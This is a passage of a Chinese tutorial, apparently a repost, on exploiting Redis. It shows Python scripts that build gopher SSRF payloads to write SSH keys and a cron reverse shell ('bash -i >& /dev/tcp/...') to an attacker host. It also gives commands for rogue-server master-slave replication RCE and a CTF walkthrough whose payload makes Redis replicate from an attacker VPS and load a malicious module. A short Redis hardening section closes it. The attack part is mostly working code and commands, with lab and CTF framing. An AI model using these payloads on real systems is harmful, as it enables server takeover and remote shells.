"config set dir &#123;&#125;".format(path),  <br>
"config set dbfilename &#123;&#125;".format(filename),  <br>
"save"  <br>
]  <br>
if passwd:  <br>
cmd.insert(0,"AUTH &#123;&#125;".format(passwd))  <br>
payload=protocol+ip+":"+port+"/_"  <br>
def redis_format(arr):  <br>
CRLF="\r\n"  <br>
redis_arr = arr.split(" ")  <br>
cmd=""  <br>
cmd+="*"+str(len(redis_arr))  <br>
for x in redis_arr:  <br>
cmd+=CRLF+"$"+str(len((x.replace("$&#123;IFS&#125;"," "))))+CRLF+x.replace("$&#123;IFS&#125;"," ")  <br>
cmd+=CRLF  <br>
return cmd  <br>
<br>
if __name__=="__main__":  <br>
for x in cmd:  <br>
payload += urllib.quote(redis_format(x))  <br>
print payload<br>
</pre><br>
执行该脚本后生成payload，同样将生成的payload进行url二次编码，然后利用受害机上的SSRF打过去：<br>
<pre class="prettyprint">ssrf.php?url=gopher%3A%2F%2F192.168.43.82%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%2524566%250D%250A%250A%250Assh-rsa%2520AAAAB3NzaC1yc2EAAAADAQABAAABgQC96S69JNdIOUWoHYOvxpnQxHAVZHl25IkDFBzTbDIbJBBABu8vqZg2GFaWhTa2jSWqMZiYwyPimrXs%252BXU1kbP4P28yFvofuWR6fYzgrybeO0KX7YmZ4xN4LWaZYEeCxzJrV7BU9wWZIGZiX7Yt5T5M3bOKofxTqqMJaRP7J1Fn9fRq3ePz17BUJNtmRx54I3CpUyigcMSTvQOawwTtXa1ZcS056mjPrKHHBNB2%2FhKINtJj1JX8R5Uz%252B3six%252BMVsxANT%252BxOMdjCq%252B%252B1skSnPczQz2GmlvfAObngQK2Eqim%252B6xewOL%252BZd2bTsWiLzLFpcFWJeoB3z209solGOSkF8nSZK1rDJ4FmZAUvl1RL5BSe%2FLjJO6%252B59ihSRFWu99N3CJcRgXLmc4MAzO4LFF3nhtq0YrIUio0qKsOmt13L0YgSHw2KzCNw4d9Hl3wiIN5ejqEztRi97x8nzAM7WvFq71fBdybzp8eLjiR8oq6ro228BdsAJYevXZPeVxjga4PDtPk%253D%2520root%2540kali%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252411%250D%250A%2Froot%2F.ssh%2F%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%252415%250D%250Aauthorized_keys%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A<br>
</pre><br>
如下图，成功在受害机上面写入SSH公钥：<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/3e6ea135e6cd713da563ecc36e387a4a.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/3e6ea135e6cd713da563ecc36e387a4a.jpg" class="img-polaroid" title="21.jpg" alt="21.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
如下图，SSH连接成功：<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/ab09c92c213966c521f1b4b51c9329c0.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/ab09c92c213966c521f1b4b51c9329c0.jpg" class="img-polaroid" title="22.jpg" alt="22.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
<h4>创建计划任务反弹Shell</h4>注意：这个只能在CentOS上使用，别的不行，原因上面已经说过了。<br>
<br>构造Redis的命令如下：<br>
<pre class="prettyprint">flushall  <br>
set 1 '\n\n*/1 * * * * bash -i >& /dev/tcp/192.168.43.247/2333 0>&1\n\n'  <br>
config set dir /var/spool/cron/  <br>
config set dbfilename root  <br>
save<br>
</pre><br>
然后编写脚本，将其转化为Gopher协议的格式：<br>
<pre class="prettyprint">import urllib  <br>
protocol="gopher://"  <br>
ip="192.168.43.82"  <br>
port="6379"  <br>
reverse_ip="192.168.43.247"  <br>
reverse_port="2333"  <br>
cron="\n\n\n\n*/1 * * * * bash -i >& /dev/tcp/%s/%s 0>&1\n\n\n\n"%(reverse_ip,reverse_port)  <br>
filename="root"  <br>
path="/var/spool/cron"  <br>
passwd=""    # 此处也可以填入Redis的密码，在不存在Redis未授权的情况下适用  <br>
cmd=["flushall",  <br>
"set 1 &#123;&#125;".format(cron.replace(" ","$&#123;IFS&#125;")),  <br>
"config set dir &#123;&#125;".format(path),  <br>
"config set dbfilename &#123;&#125;".format(filename),  <br>
"save"  <br>
]  <br>
if passwd:  <br>
cmd.insert(0,"AUTH &#123;&#125;".format(passwd))  <br>
payload=protocol+ip+":"+port+"/_"  <br>
def redis_format(arr):  <br>
CRLF="\r\n"  <br>
redis_arr = arr.split(" ")  <br>
cmd=""  <br>
cmd+="*"+str(len(redis_arr))  <br>
for x in redis_arr:  <br>
cmd+=CRLF+"$"+str(len((x.replace("$&#123;IFS&#125;"," "))))+CRLF+x.replace("$&#123;IFS&#125;"," ")  <br>
cmd+=CRLF  <br>
return cmd  <br>
<br>
if __name__=="__main__":  <br>
for x in cmd:  <br>
payload += urllib.quote(redis_format(x))  <br>
print payload<br>
</pre><br>
生成的payload同样进行url二次编码，然后利用Ubuntu服务器上的SSRF打过去，即可在受害机上面写入计划任务，等到时间后，攻击机上就会获得目标主机的Shell。<br>
<h3>Redis基于主从复制的命令执行</h3><h4>Redis主从复制</h4>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机（从机），其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/1093d3f77a4d2ad42b57480f150dd250.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/1093d3f77a4d2ad42b57480f150dd250.jpg" class="img-polaroid" title="23.jpg" alt="23.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
<h4>Redis主从复制进行RCE</h4>在2019年7月7日结束的WCTF2019 Final上，LC/BC的成员Pavel Toporkov在分享会上介绍了一种关于Redis 4.x/5.x的RCE利用方式，比起以前的利用方式来说，这种利用方式更为通用，危害也更大。<br>
<br>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以在Redis中实现一个新的Redis命令。我们可以通过外部拓展（.so），在Redis中创建一个用于执行系统命令的函数。<br>
<br>实验环境：<br>
<ul><li>攻击机Kali：192.168.43.247</li><li>受害机Ubuntu：192.168.43.82</li></ul><br>
<br><h4>利用redis-rogue-server工具</h4>下载地址：<a href="https://github.com/n0b0dyCN/redis-rogue-server" rel="nofollow" target="_blank">https://github.com/n0b0dyCN/redis-rogue-server</a><br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/336ff24ef7564be51e9e8f89f05c9be5.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/336ff24ef7564be51e9e8f89f05c9be5.jpg" class="img-polaroid" title="24.jpg" alt="24.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
该工具的原理就是首先创建一个恶意的Redis服务器作为Redis主机（master），该Redis主机能够回应其他连接他的Redis从机的响应。有了恶意的Redis主机之后，就会远程连接目标Redis服务器，通过<code class="prettyprint">slaveof</code>命令将目标Redis服务器设置为我们恶意Redis的Redis从机（slaver）。然后将恶意Redis主机上的exp同步到Reids从机上，并将dbfilename设置为exp.so。最后再控制Redis从机（slaver）加载模块执行系统命令即可。<br>
<br>但是该工具无法数据Redis密码进行Redis认证，也就是说该工具只能在目标存在Redis未授权访问漏洞时使用。如果目标Redis存在密码是不能使用该工具的。<br>
<br>使用方法：<br>
<pre class="prettyprint">python3 redis-rogue-server.py --rhost 192.168.43.82 --lhost 192.168.43.247  <br>
# python3 redis-rogue-server.py --rhost rhost --lhost lhost<br>
</pre><br>
执行后，可以选择获得一个交互式的Shell（interactive shell）或者是反弹Shell（reserve shell）：<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/960a288928d42539c356cbde7759cf96.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/960a288928d42539c356cbde7759cf96.jpg" class="img-polaroid" title="25.jpg" alt="25.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
比如我们选择<code class="prettyprint">i</code>来获得一个交互式的Shell，执行在里面执行系统命令即可：<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/82c5d0a4fd6c7f9324c677e700d4fb1f.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/82c5d0a4fd6c7f9324c677e700d4fb1f.jpg" class="img-polaroid" title="26.jpg" alt="26.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
也可以选择<code class="prettyprint">r</code>来获得一个反弹Shell：<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/880fb3ebef8489b156a64b95db396312.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/880fb3ebef8489b156a64b95db396312.jpg" class="img-polaroid" title="27.jpg" alt="27.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
前面说了，该工具只能在目标存在Redis未授权访问漏洞时使用，当目标Redis存在密码时是不能使用该工具的。所以我们还要看看别的工具。<br>
<h4>利用 redis-rce 工具</h4>下载地址：<a href="https://github.com/Ridter/redis-rce" rel="nofollow" target="_blank">https://github.com/Ridter/redis-rce</a><br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/fab02ab4dc32555b3dfd245fd88f614e.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/fab02ab4dc32555b3dfd245fd88f614e.jpg" class="img-polaroid" title="28.jpg" alt="28.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
可以看到该工具有一个<code class="prettyprint">-a</code>选项，可以用来进行Redis认证。<br>
<br>但是这个工具里少一个exp.so的文件，我们还需要去上面那个到<a href="https://github.com/n0b0dyCN/redis-rogue-server">redis-rogue-server</a>工具中找到exp.so文件并复制到redis-rce.py同一目录下，然后执行如下命令即可：<br>
<pre class="prettyprint">python3 redis-rce.py -r 192.168.43.82 -L 192.168.43.247 -f exp.so -a 657260  <br>
<br>
# python3 redis-rce.py -r rhost -lhost lhost -f exp.so -a password<br>
</pre><br>
执行后，同样可以选择获得一个交互式的Shell（interactive shell）或者是反弹Shell（reserve shell）：<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/9bfb7c23b6faf9e9a6a38b9277beb5c5.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/9bfb7c23b6faf9e9a6a38b9277beb5c5.jpg" class="img-polaroid" title="29.jpg" alt="29.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
比如我们选择<code class="prettyprint">i</code>来获得一个交互式的Shell，执行在里面执行系统命令即可：<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/4958e5d2cac10e3a1c7addb0fc7e22e0.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/4958e5d2cac10e3a1c7addb0fc7e22e0.jpg" class="img-polaroid" title="30.jpg" alt="30.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
也可以选择<code class="prettyprint">r</code>来获得一个反弹Shell：<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/b65e245360ee0b43acd4d90802d299fe.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/b65e245360ee0b43acd4d90802d299fe.jpg" class="img-polaroid" title="31.jpg" alt="31.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
<h4>Redis主从复制在SSRF中的利用</h4>这里，我们通过<a href="https://buuoj.cn/login?next=%2Fchallenges%3F#%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E7%8E%84%E6%AD%A6%E7%BB%84%5DSSRFMe">[网鼎杯 2020 玄武组]SSRFMe</a>这道CTF题目来演示。<br>
<br>进入题目，给出源码：<br>
<pre class="prettyprint"><?php  <br>
function check_inner_ip($url)  <br>
&#123;  <br>
$match_result=preg_match('/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/',$url);  <br>
if (!$match_result)  <br>
&#123;  <br>
die('url fomat error');  <br>
&#125;  <br>
try  <br>
&#123;  <br>
$url_parse=parse_url($url);  <br>
&#125;  <br>
catch(Exception $e)  <br>
&#123;  <br>
die('url fomat error');  <br>
return false;  <br>
&#125;  <br>
$hostname=$url_parse['host'];  <br>
$ip=gethostbyname($hostname);  <br>
$int_ip=ip2long($ip);  <br>
return ip2long('127.0.0.0')>>24 == $int_ip>>24 || ip2long('10.0.0.0')>>24 == $int_ip>>24 || ip2long('172.16.0.0')>>20 == $int_ip>>20 || ip2long('192.168.0.0')>>16 == $int_ip>>16;  <br>
&#125;  <br>
<br>
function safe_request_url($url)  <br>
&#123;  <br>
<br>
if (check_inner_ip($url))  <br>
&#123;  <br>
echo $url.' is inner ip';  <br>
&#125;  <br>
else  <br>
&#123;  <br>
$ch = curl_init();  <br>
curl_setopt($ch, CURLOPT_URL, $url);  <br>
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  <br>
curl_setopt($ch, CURLOPT_HEADER, 0);  <br>
$output = curl_exec($ch);  <br>
$result_info = curl_getinfo($ch);  <br>
if ($result_info['redirect_url'])  <br>
&#123;  <br>
safe_request_url($result_info['redirect_url']);  <br>
&#125;  <br>
curl_close($ch);  <br>
var_dump($output);  <br>
&#125;  <br>
<br>
&#125;  <br>
if(isset($_GET['url']))&#123;  <br>
$url = $_GET['url'];  <br>
if(!empty($url))&#123;  <br>
safe_request_url($url);  <br>
&#125;  <br>
&#125;  <br>
else&#123;  <br>
highlight_file(__FILE__);  <br>
&#125;  <br>
// Please visit hint.php locally.  <br>
?><br>
</pre><br>
这源码见过好多次了，让我们从本地访问hint.php，但是要先绕过对内网IP的检测。这里我们可以利用curl和parse_url的解析差异来绕过，payload：<br>
<pre class="prettyprint">/?url=http://@127.0.0.1:80@www.baidu.com/hint.php<br>
</pre><br>
但是这里并不成功，因为这个方法在Curl较新的版本里被修掉了，所以我们还可以使用另一种方法，即<code class="prettyprint">0.0.0.0</code>。<code class="prettyprint">0.0.0.0</code>这个IP地址表示整个网络，可以代表本机IPv4的所有地址，使用如下即可绕过：<br>
<pre class="prettyprint">/?url=http://0.0.0.0/hint.php<br>
</pre><br>
如下图所示，成功访问hint.php并得到源码：<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/9ea3399bdffe9dae7b2fbf6da400a5a3.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/9ea3399bdffe9dae7b2fbf6da400a5a3.jpg" class="img-polaroid" title="32.jpg" alt="32.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
在hint.php中发现了Redis的密码为root，看来是要利用主从复制来打Redis了。<br>
<br>需要以下即可工具：<br>
<ul><li><a href="https://github.com/xmsec/redis-ssrf" rel="nofollow" target="_blank">https://github.com/xmsec/redis-ssrf</a>（用于生成Gopher协议的payload并搭建恶意的Redis主机）</li><li><a href="https://github.com/n0b0dyCN/redis-rogue-server" rel="nofollow" target="_blank">https://github.com/n0b0dyCN/redis-rogue-server</a>（需要利用这里面的exp.so）</li></ul><br>
<br>首先来看redis-ssrf中的ssrf-redis.py脚本：<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/382ff56686b18c2be8928f7dfc1b08b7.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/382ff56686b18c2be8928f7dfc1b08b7.jpg" class="img-polaroid" title="33.jpg" alt="33.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
如上图所示，通过选择不同的mode选项可以选择不同的攻击方式。这里我们选择mode 3，通过主从复制在目标主机上执行命令。需要修改以下几个地方：<br>
<ul><li>将<code class="prettyprint">lhost</code>改为攻击者vps的IP（47.xxx.xxx.72），用于控制目标Redis服务器连接位于攻击者vps上6666端口上伪造的恶意Redis主机。</li><li>将command修改为要执行的命令</li><li>将第140行的“127.0.0.1”改为“0.0.0.0”，用于绕过题目对于内网IP的限制。</li><li>最后在第160行填写上Redis的密码“root”。</li></ul><br>
<br>改完后如下：<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/bb99d9db61c9ecd423417a7ca9484a14.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/bb99d9db61c9ecd423417a7ca9484a14.jpg" class="img-polaroid" title="34.jpg" alt="34.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/2298e2306970d7f83ff9991563006496.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/2298e2306970d7f83ff9991563006496.jpg" class="img-polaroid" title="35.jpg" alt="35.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
然后执行该脚本生成payload：<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/aa538b0de72c18c1696cf93f1e873099.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/aa538b0de72c18c1696cf93f1e873099.jpg" class="img-polaroid" title="36.jpg" alt="36.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
由于题目需要发送的是GET请求，所以需要将payload进行url二次编码，得到最终的payload为：<br>
<pre class="prettyprint">gopher%3A%2F%2F0.0.0.0%3A6379%2F_%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%25244%250D%250Aroot%250D%250A%252A3%250D%250A%25247%250D%250ASLAVEOF%250D%250A%252412%250D%250A47.101.57.72%250D%250A%25244%250D%250A6666%250D%250A%252A4%250D%250A%25246%250D%250ACONFIG%250D%250A%25243%250D%250ASET%250D%250A%25243%250D%250Adir%250D%250A%25245%250D%250A%2Ftmp%2F%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25246%250D%250Aexp.so%250D%250A%252A3%250D%250A%25246%250D%250AMODULE%250D%250A%25244%250D%250ALOAD%250D%250A%252411%250D%250A%2Ftmp%2Fexp.so%250D%250A%252A2%250D%250A%252411%250D%250Asystem.exec%250D%250A%252414%250D%250Acat%2524%257BIFS%257D%2Fflag%250D%250A%252A1%250D%250A%25244%250D%250Aquit%250D%250A<br>
</pre><br>
然后将redis-rogue-server中的exp.so复制到redis-ssrf目录中，并使用redis-ssrf中的rogue-server.py在攻击者vps的6666端口上面搭建恶意的Redis主机。<br>
<br>但是这里需要写个死循环一直跑rogue-server.py，不然当目标机的Redis连接过来之后，一连上就自动断开连接，可能导致exp.so都没传完就中断了。<br>
<pre class="prettyprint"># do.sh  <br>
while [ "1" = "1" ]  <br>
do  <br>
python rogue-server.py  <br>
done<br>
</pre><br>
执行do.sh脚本即可：<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/50be7946796372488ad9065a5ae449f5.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/50be7946796372488ad9065a5ae449f5.jpg" class="img-polaroid" title="37.jpg" alt="37.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
然后执行之前生成的payload：<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/d12d097883e6b355df044e020d55d483.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/d12d097883e6b355df044e020d55d483.jpg" class="img-polaroid" title="38.jpg" alt="38.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
如上图所示，成功执行命令并得到flag。<br>
<h3>Redis安全防护策略</h3>如何防护你的Redis我认为可以从以下几个方面切入。<br>
<h4>禁止监听在公网地址</h4>将你的Redis监听在0.0.0.0的是十分危险的行为，对Redis的大多数攻击也都是由于管理员的大意而将Redis监听在了0.0.0.0。 作为一个经常在内网中出现的应用，将Redis监听在0.0.0.0很可能导致内网横向移动渗透风险。<br>
<br>修改Redis监听端口需要在Redis的配置文件redis.conf中进行设置，找到包含bind的行，将默认的<code class="prettyprint">bind 0.0.0.0</code>改为<code class="prettyprint">bind 0.0.0.0</code>或内网IP，然后重启 Redis。<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/8956ea91d52f225ec1e8bfbb8e133d94.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/8956ea91d52f225ec1e8bfbb8e133d94.jpg" class="img-polaroid" title="39.jpg" alt="39.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
<h4>修改默认的监听端口</h4>Redis默认监听的端口为6379，为了更好地隐藏服务，我们可以在redis.conf中修改Redis的监听端口。找到包含port的行，将默认的6379改为其他自定义的端口号，然后重启Redis。<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/0c39edbcb46ad3457befc3feff80155c.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/0c39edbcb46ad3457befc3feff80155c.jpg" class="img-polaroid" title="40.jpg" alt="40.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
<h4>开启Redis安全认证并设置复杂的密码</h4>为了防止Redis未授权访问攻击以及对Redis密码的爆破，我们可以在Redis在redis.conf配置文件中，通过requirepass选项开启密码认证并设置强密码。<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210804/359d16fcdc92755bf6cc696d594064e7.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210804/359d16fcdc92755bf6cc696d594064e7.jpg" class="img-polaroid" title="41.jpg" alt="41.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
<h4>禁止使用Root权限启动</h4>使用Root权限去运行网络服务是比较有风险的，所以不建议使用任Root权限的何用户启动Redis。加固建议如下：<br>
<pre class="prettyprint">useradd -s /sbin/nolog -M redis <br>
sudo -u redis /<redis-server-path>/redis-server /<configpath>/redis.conf <br>
</pre><br>
<h4>设置Redis配置文件的访问权限</h4>因为 Redis 的明文密码可能会存储在配置文件中，禁止不相关的用户访问改配置文件是必要的，如下设置Redis配置文件权限为600：<br>
<pre class="prettyprint">chmod 600 /<filepath>/redis.conf<br>
</pre><br>
参考链接：<br>
<ol><li><a href="https://blog.csdn.net/cj_Allen/article/details/106855893" rel="nofollow" target="_blank">https://blog.csdn.net/cj_Allen ... 55893</a></li><li><a href="https://www.redteaming.top/2019/07/15/" rel="nofollow" target="_blank">https://www.redteaming.top/2019/07/15/</a>浅析Redis中SSRF的利用/#Redis配合gopher协议进行SSRF</li><li><a href="https://www.freebuf.com/articles/web/260806.html" rel="nofollow" target="_blank">https://www.freebuf.com/articles/web/260806.html</a></li></ol><br>
<br>原文链接：<a href="https://www.freebuf.com/articles/network/280984.html" rel="nofollow" target="_blank">https://www.freebuf.com/articl ... .html</a>
                                                                <div class="aw-upload-img-list">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </div>
                                
                                                                <ul class="aw-upload-file-list">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </ul>
                                                              
</div>
            